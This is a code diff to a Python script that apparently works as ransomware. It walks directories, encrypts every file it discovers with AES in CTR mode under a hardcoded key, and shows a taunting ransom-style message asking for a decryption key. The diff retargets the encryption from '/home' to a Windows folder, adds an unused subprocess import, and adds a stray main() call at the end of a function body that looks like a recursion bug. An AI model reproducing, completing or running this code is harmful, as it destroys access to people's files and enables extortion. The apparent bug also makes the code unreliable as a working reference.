@@ -3,9 +3,9 @@ from Cryptodome.Cipher import AES
 from Cryptodome.Util import Counter
 import argparse
 import os
-
 import discover
 import modify
+from subprocess import call
 
 # -----------------
 # GLOBAL VARIABLES
@@ -41,9 +41,8 @@ your files forever. Do not include the surrounding quotes, but do make sure
 to match case, special characters, and anything else EXACTLY!
 Happy decrypting and be more careful next time!
 
-Your decryption key is: '{}'
-
-''').format(HARDCODED_KEY)
+Your decryption key is: %s
+''' % HARDCODED_KEY)
         key = input('Enter Your Key> ')
 
     else:
@@ -57,10 +56,10 @@ Your decryption key is: '{}'
         #     key = random(32)
 
     ctr = Counter.new(128)
-    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
+    crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
 
     # change this to fit your needs.
-    startdirs = ['/home']
+    startdirs = ['C:\\CryptMe']
 
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
@@ -78,6 +77,8 @@ Your decryption key is: '{}'
          # post encrypt stuff
          # desktop picture
          # icon, etc
+
+    main()
 
 if __name__=="__main__":
     main()
